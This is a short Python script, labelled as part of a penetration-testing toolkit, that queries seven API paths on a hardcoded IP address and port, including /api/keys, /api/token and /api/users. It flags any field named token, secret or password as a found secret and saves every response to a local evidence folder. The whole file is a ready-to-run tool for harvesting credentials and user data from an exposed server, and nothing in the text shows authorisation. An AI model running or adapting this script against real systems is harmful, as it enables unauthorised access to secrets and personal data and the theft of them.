#!/usr/bin/env python3
# Copyright (c) 2026 PenTestToolkit
# SPDX-License-Identifier: MIT
"""
Extract data from exposed API endpoints on 196.218.83.9:8080
"""

import requests
import json
import os

ip = '196.218.83.9'
port = 8080
base = f'http://{ip}:{port}'

print(f"Extracting data from exposed API endpoints on {ip}:{port}\n")
print("="*60)

endpoints = [
    '/api/keys',
    '/api/token',
    '/api/settings',
    '/api/users',
    '/api/models',
    '/api/channels',
    '/api/tasks',
]

# Ensure evidence directory exists
os.makedirs('evidence', exist_ok=True)

for endpoint in endpoints:
    url = f"{base}{endpoint}"
    print(f"\n[{endpoint}]")
    try:
        resp = requests.get(url, timeout=5)
        print(f"  Status: {resp.status_code}")
        
        if resp.status_code == 200:
            try:
                data = resp.json()
                print(f"  Data type: {type(data).__name__}")
                if isinstance(data, list):
                    print(f"  Items count: {len(data)}")
                    if len(data) > 0:
                        print(f"  First item: {json.dumps(data[0], indent=2)[:200]}")
                elif isinstance(data, dict):
                    print(f"  Keys: {list(data.keys())}")
                    for key, value in data.items():
                        if key in ['api_key', 'token', 'secret', 'password', 'key']:
                            print(f"  *** POTENTIAL SECRET FOUND: {key} ***")
                        print(f"    {key}: {str(value)[:100]}")
                
                # Save to file
                filename = endpoint.replace('/', '_').strip('_') + '.json'
                filepath = os.path.join('evidence', filename)
                with open(filepath, 'w') as f:
                    json.dump(data, f, indent=2)
                print(f"  [SAVED] {filepath}")
                
            except Exception as e:
                print(f"  Text preview: {resp.text[:200]}")
                print(f"  Parse error: {e}")
        else:
            print(f"  Not accessible (status: {resp.status_code})")
            
    except Exception as e:
        print(f"  Error: {e}")

print("\n" + "="*60)
print("EXTRACTION COMPLETE")
print("Check evidence/ directory for saved files")
print("="*60)
